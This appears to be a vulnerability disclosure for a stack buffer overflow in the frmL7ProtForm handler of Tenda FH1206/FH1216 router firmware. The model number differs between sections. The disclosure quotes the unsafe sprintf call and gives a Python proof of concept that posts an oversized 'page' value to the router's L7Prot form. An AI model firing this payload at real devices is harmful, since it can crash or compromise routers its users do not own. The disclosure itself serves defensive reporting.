# frmL7ProtForm

## Overview

- Firmware download website: https://www.tendacn.com/hk/download/detail-2344.html

## Affected version

FH1206 V1.2.0.8(8155)_EN

## Vulnerability details

There is a stack buffer overflow vulnerability in Tenda FH1216 V1.2.0.8(8155)_EN, located in the **frmL7ProtForm** function. The function receives the `page` parameter from a POST request. `   sprintf(v15, "firewall_proto_list.asp?page=%s", v10);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v15` array, thereby triggering this security vulnerability.




## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/L7Prot"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

